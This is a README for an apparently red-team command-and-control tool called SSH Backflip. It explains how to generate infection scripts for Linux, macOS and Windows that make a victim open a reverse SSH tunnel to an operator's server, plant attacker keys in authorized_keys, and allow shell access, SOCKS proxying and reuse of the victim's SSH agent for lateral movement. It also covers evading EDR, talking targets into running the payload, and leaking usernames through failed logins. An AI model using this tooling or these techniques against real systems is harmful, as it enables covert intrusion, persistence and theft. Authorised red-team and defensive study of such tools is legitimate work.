# The SSH Backflip <br>
<br>
The SSH Backflip is a convenient mechanism for Command and Control based on SSH and offering features such as:<br>
* Living Of the Land <br>
* Accepted in more places than even mastercard <br>
* Strong traffic encryption <br>
* Key based authentication <br>
* CLI access <br>
* File transfers <br>
* SOCKS proxy <br>
* SSH agent reuse (as in, "reuse the victim's ssh agent for lateral movement") <br>


## WTF <br>
What we call an SSH Backflip is nothing more than some clever use of SSH.<br>
We start by establishing an outbound SSH connection from the victim to our C2 server. This outbound conection establishes an "ssh tunnel" configured to forward a port from the victim host back to the C2 server. To prevent the connecting victim from running commands on the C2 server we use a carefully crafted systemd configuration to sandbox the C2 instance of sshd. Additionally, the "flip" user is configured without a shell.<br> We do a port forward of TCP/22 (ssh) from the victim to TCP/400x on the C2 server. For each new victim we assign a new port, for example 4001, 4002, 4003, etc. This allows us to expose multiple victims' SSH endpoints on the C2 server side.<br>

Authentication is key-based and we allocate a unique set of keys per victim. Each set of (public-private) keys serve dual purpose: they allow us to authenticate the victim's connection to the C2 server and at the same time allow us to login on the victim system.<br>

To run commands on the victim workstation we simply start an SSH session on the C2 server connecting to the local port assigned to the desired victim.<br>

Outbound SSH connections are usually whitelisted by corporate firewalls. Also, they draw less attention than inbound SSH connections. Because we are connecting to the victim's SSH port through the tunnel, our connection into the victim will appear to come from the victim itself (127.0.0.1) and likely be ignored by HIPS and EDR.<br>


## Components

To use the SSH backflips you'll need:
* SSH server for backflips (with the right configurations).
* User to associate with and authenticate incoming backlfips connections. We like to name it "**flip**".
* Python scripts to manage backflips and generate "backflip payloads" used to infect victims.
* Payload templates for the different systems you want to backflip, we include linux (python 2 and 3), macos (bash) and windows (powershell)
* Configuration file "etc/backflips.conf" which stores parameters needed by the above mentioned Python scripts.
* SSH config file "etc/backflips_db" that serves as a database for storing backflip connections.



### etc/backflips.conf
This stores the basic configurations for generating new backflips. The default configuration looks as follows:<br>
```
[DEFAULT]
callbackHost = redteamexample.com
internalIP = 127.0.0.1
callbackPort = 2222
callbackUser = flip
baseDir = /opt/backflips/
```

At a minimum you should customize the "callbackHost" with the FQDN you want to use for your own C2. <br>
The "callbackPort" is port where your ssh backflips server is listening for victim connections calling back.
If you deployed RTI with multiple backflip containers we recommend you update the configuration using the sshbackflip.py command line tool as decribed below.

### sshbackflip.py
The script has two main commands: `backflip` for managing victim connections and `listener` for managing C2 endpoints.

#### The "backflip" command
The backflip command manages all victim-related operations with the following subcommands:

##### backflip new
Creates a new backflip instance by generating keys, designating a port on the C2 server, and outputting an infection script for the target system. Supports linux (python2/python3), macos, and windows targets.<br>
Example usage:<br>
`python3 sshbackflip.py backflip new -b redteamexample.com -p 4001 -u johndoe -t victimcomputer1 -o linux`<br><br>
This command will setup a new backflip and output a script to target the user "johndoe" on the host "victimcomputer1". It's up to you to convince "John" to run the script. When "johndoe" executes the script on their host it will do an SSH backlfip, connecting back to our C2 server "redteamexample.com" and port forwarding it's port 22 to our port 4001.<br>
* You can omit -b to use the default FQDN from backflips.conf<br>
* You can omit -u if you don't know the victim's username (see "the faceplant" below)<br>
* You can omit -p to auto-select the first available port (4001-4999)<br>

The script saves keys in `keys/` and the infection script in `payloads/`.<br>

##### backflip connect
Connect to a victim's computer if they're successfully connected to the C2 server.<br>
Example usage:<br>
`python3 sshbackflip.py backflip connect -t victimcomputer1`<br>

##### backflip list
List all backflip instances in the database.<br>
Example usage:<br>
`python3 sshbackflip.py backflip list`<br>

##### backflip delete
Remove a victim host record from the database (does not delete keys).<br>
Example usage:<br>
`python3 sshbackflip.py backflip delete -t victimcomputer1`<br>

##### backflip socks
Manage SOCKS proxy for a victim connection. Enables proxying traffic through the victim's computer.<br>
Example usage:<br>
`python3 sshbackflip.py backflip socks -t victimcomputer1 --enable`<br>
`python3 sshbackflip.py backflip socks -t victimcomputer1 --disable`<br>

##### backflip check-faceplant
Check SSH logs for username leaks from faceplant attempts and update victim usernames in the database.<br>
Example usage:<br>
`python3 sshbackflip.py backflip check-faceplant` - Check logs from today<br>
`python3 sshbackflip.py backflip check-faceplant -d 2024-01-15` - Check logs from a specific date<br>

#### The "listener" command
Manages the C2 endpoints that receive victim callbacks. The following subcommands are available:

* `python3 sshbackflip.py listener list` - Show configured C2 endpoints
* `python3 sshbackflip.py listener add --name example --callback-host www.example.com --internal-ip 192.168.1.101 --port 8022 --user flip` - Add a new C2 endpoint
* `python3 sshbackflip.py listener delete --name example` - Remove a C2 endpoint
* `python3 sshbackflip.py listener reconcile` - Update endpoint IPs from container mapping

#### The "faceplant"
You need to know the username that ran the payload and got infected. The reason is that our malicious SSH keys got added to their SSH "authorized_keys" file and when we connect to their host to get a shell we will login to their account. So what happens if you didn't know the username in advance and you didn't specify it when you setup the new backflip? Don't worry, the first time the payload executes on the victim host it leak the data to us. This is achieved by making an SSH connection attempt from the victim to the C2 server with the victim's username and a random locator word. The connection will fail due to "incorrect username" and we'll see this in our C2 SSH server logs. We affectionately call this a "faceplant".<br>
You can check the logs to find faceplant like this:<br>
`sudo journalctl -S -u ssh-backflips |grep -i "<random locator word>"`<br>
Once you know the correct username of the victim you can update the User data in `etc/backflips_db`. (We should probably automate this, there's an opportunity for you to contribute some code to the project). <br>

### Templates and stuff
The "payloads" generated by `sshbackflip.py` are based on templates (jinja2) you can find under `sshbackflip/linux` or `sshbackflip/macos` or `sshbackflip/windows` depending on the OS they target.<br>
If you want to adjust their behavior or add new go ahead and play with the templates over there.<br>
You'll notice that the **windows** subfolder includes a copy of win32-openssh for use in case the victim windows host doesn't already have OpenSSH installed. We grabbed it from here: https://github.com/PowerShell/Win32-OpenSSH/releases. If you want you can modify the template to download the latest release from github directly on the victim host.<br>


## Things to Note

* You are running an additional ssh server that your victims ssh to. This can be abused by somebody who has control of the victim machine. While shell access is disabled, the service is sandboxed, and only port forwarding will work, one should be aware of this caveat.<br>
